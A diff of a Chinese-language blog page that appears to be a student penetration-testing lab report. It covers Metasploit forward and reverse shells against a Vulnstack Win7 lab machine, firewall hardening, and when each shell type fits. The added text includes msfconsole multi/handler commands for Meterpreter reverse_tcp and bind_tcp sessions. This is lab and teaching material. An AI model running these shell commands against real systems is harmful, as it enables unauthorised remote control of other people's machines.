@@ -6,12 +6,12 @@
   
   <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="目标机为vulnstack-win7,攻击机为kali 生成反向TCP Shell(1)：打开kali终端，执行命令生成payload(2)查询目标机ip及开放端口 生成正向TCP Shell 配置Metasploit&#x2F;multi&#x2F;handler模块(1)启动msfconsole,加载反向Shell监听模块加载反向shell  对目标windows主机进行安全加固创建入站阻止规">
+  <meta name="description" content="渗透测试实验报告 - 正反向Shell攻防实践目标机为vulnstack-win7,攻击机为kali 实验信息 · 实验名称: 基于MSF的正反向Shell攻防实践 · 实验日期: 2025-10-28 · 实验人员: [填写姓名] · 实验环境: Kali Linux (攻击机) + Vulnstack-Win7 (靶机) 一、实验目的  掌握MSFVenom工具生成定制化有效负载的方法 理解正">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/2025/10/28/day2%E4%BB%BB%E5%8A%A1/day2%E4%BB%BB%E5%8A%A1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="目标机为vulnstack-win7,攻击机为kali 生成反向TCP Shell(1)：打开kali终端，执行命令生成payload(2)查询目标机ip及开放端口 生成正向TCP Shell 配置Metasploit&#x2F;multi&#x2F;handler模块(1)启动msfconsole,加载反向Shell监听模块加载反向shell  对目标windows主机进行安全加固创建入站阻止规">
+<meta property="og:description" content="渗透测试实验报告 - 正反向Shell攻防实践目标机为vulnstack-win7,攻击机为kali 实验信息 · 实验名称: 基于MSF的正反向Shell攻防实践 · 实验日期: 2025-10-28 · 实验人员: [填写姓名] · 实验环境: Kali Linux (攻击机) + Vulnstack-Win7 (靶机) 一、实验目的  掌握MSFVenom工具生成定制化有效负载的方法 理解正">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/payload.png">
 <meta property="og:image" content="http://example.com/cxkfdk.png">
@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://example.com/rzgz.png">
 <meta property="og:image" content="http://example.com/czgz.png">
 <meta property="article:published_time" content="2025-10-28T05:35:27.631Z">
-<meta property="article:modified_time" content="2025-10-28T06:41:42.771Z">
+<meta property="article:modified_time" content="2025-10-28T12:00:59.284Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/payload.png">
@@ -93,14 +93,52 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="目标机为vulnstack-win7-攻击机为kali"><a href="#目标机为vulnstack-win7-攻击机为kali" class="headerlink" title="目标机为vulnstack-win7,攻击机为kali"></a>目标机为vulnstack-win7,攻击机为kali</h1><ol>
+        <h1 id="渗透测试实验报告-正反向Shell攻防实践"><a href="#渗透测试实验报告-正反向Shell攻防实践" class="headerlink" title="渗透测试实验报告 - 正反向Shell攻防实践"></a>渗透测试实验报告 - 正反向Shell攻防实践</h1><h3 id="目标机为vulnstack-win7-攻击机为kali"><a href="#目标机为vulnstack-win7-攻击机为kali" class="headerlink" title="目标机为vulnstack-win7,攻击机为kali"></a>目标机为vulnstack-win7,攻击机为kali</h3><p> 实验信息</p>
+<p>· 实验名称: 基于MSF的正反向Shell攻防实践</p>
+<p>· 实验日期: 2025-10-28</p>
+<p>· 实验人员: [填写姓名]</p>
+<p>· 实验环境: Kali Linux (攻击机) + Vulnstack-Win7 (靶机)</p>
+<p>一、实验目的</p>
+<ol>
+<li>掌握MSFVenom工具生成定制化有效负载的方法</li>
+<li>理解正向Shell与反向Shell的本质区别及适用场景</li>
+<li>学习通过防火墙规则配置进行主机安全加固</li>
+<li>分析不同网络环境下的Shell连接策略选择</li>
+</ol>
+<p>二、实验环境</p>
+<p>角色 系统 IP地址 备注<br>攻击机 Kali Linux 192.168.1.10 渗透测试平台</p>
+<p>目标机 Windows 7 192.168.1.20 Vulnstack漏洞环境</p>
+<p>三、实验步骤</p>
+<p>任务1：环境准备</p>
+<p>· 下载并安装Vulnstack-Win7漏洞环境</p>
+<p>· 确保攻击机与目标机网络连通性</p>
+<p>任务2：生成有效负载</p>
+<ol>
 <li>生成反向TCP Shell<br><br>(1)：打开kali终端，执行命令生成payload<br><img src="/payload.png" alt="生成payload"><br>(2)查询目标机ip及开放端口<br><img src="/cxkfdk.png" alt="目标机ip和开放端口"></li>
 <li>生成正向TCP Shell<br><img src="/zxtcp.png" alt="正向TCP Shell"></li>
-<li>配置Metasploit&#x2F;multi&#x2F;handler模块<br><br>(1)启动msfconsole,加载反向Shell监听模块<br><img src="/msfconsole.png" alt="启动msfconsole"><br>加载反向shell<br><img src="/fxshell.png" alt="加载反向shell"></li>
+<li>配置Metasploit&#x2F;multi&#x2F;handler模块<br><br>(1)启动msfconsole,加载反向Shell监听模块</li>
 </ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.10</span><br><span class="line"><span class="built_in">set</span> LPORT 7777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/msfconsole.png" alt="启动msfconsole"><br>加载反向shell<br><img src="/fxshell.png" alt="加载反向shell"><br>配置正向Shell连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.1.20</span><br><span class="line"><span class="built_in">set</span> LPORT 7777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <h1 id="对目标windows主机进行安全加固"><a href="#对目标windows主机进行安全加固" class="headerlink" title="对目标windows主机进行安全加固"></a>对目标windows主机进行安全加固</h1><h3 id="创建入站阻止规则"><a href="#创建入站阻止规则" class="headerlink" title="创建入站阻止规则"></a>创建入站阻止规则</h3><p>1. 进入win7 虚拟机</p>
 <p>2. 点击入站规则→新建规则，选择“端口”→“TCP”→输入需阻止的端口（如任务三的4444&#x2F;5555）→选择“阻止连接”→应用到“域、专用、公用”所有配置文件→命名规则（如“Block_Shell_Port”）。<br><img src="/rzgz.png" alt="设置入站规则"></p>
 <h3 id="创建出站阻止规则"><a href="#创建出站阻止规则" class="headerlink" title="创建出站阻止规则"></a>创建出站阻止规则</h3><p>1. 点击出站规则→新建规则，重复上述步骤，阻止相同端口的出站连接。<br><img src="/czgz.png" alt="设置出站规则"></p>
+<p>防御效果验证</p>
+<p>· 执行生成的Shell程序</p>
+<p>· 验证正向&#x2F;反向Shell均无法建立连接</p>
+<p>· 记录防火墙拦截日志</p>
+<p>实验结果与分析</p>
+<ol>
+<li>正反向Shell对比</li>
+</ol>
+<p>反向Shell 目标机→攻击机 目标机有公网IP或出站限制宽松 绕过入站防火墙，需要攻击机有固定IP</p>
+<p>正向Shell 攻击机→目标机 目标机无出网权限或内网环境 依赖目标机开放端口，易被入站规则拦截</p>
+<p>防御效果验证结果</p>
+<p>· 加固前: 正反向Shell均能成功建立连接</p>
+<p>· 加固后:<br>  · 反向Shell被出站规则阻断</p>
+<p>  · 正向Shell被入站规则阻断</p>
+<p>结论: 防火墙规则配置有效防御了本次攻击</p>
 <h1 id="在真实的渗透测试中，什么场景下更适合使用反向Shell-什么场景下更适合使用正向Shell？"><a href="#在真实的渗透测试中，什么场景下更适合使用反向Shell-什么场景下更适合使用正向Shell？" class="headerlink" title="在真实的渗透测试中，什么场景下更适合使用反向Shell?什么场景下更适合使用正向Shell？"></a>在真实的渗透测试中，什么场景下更适合使用反向Shell?什么场景下更适合使用正向Shell？</h1><h3 id="更适合反向Shell："><a href="#更适合反向Shell：" class="headerlink" title="更适合反向Shell："></a>更适合反向Shell：</h3><ol>
 <li>目标主机位于内网，无公网IP<br>  攻击者无法主动连接目标，只能让目标主动“反弹”连接攻击者的公网监听端口。</li>
 <li>目标主机出站流量未被严格限制<br>  即使目标主机入站端口被封，只要它能访问外网（如DNS、HTTP等），就可以通过反向shell建立连接。</li>
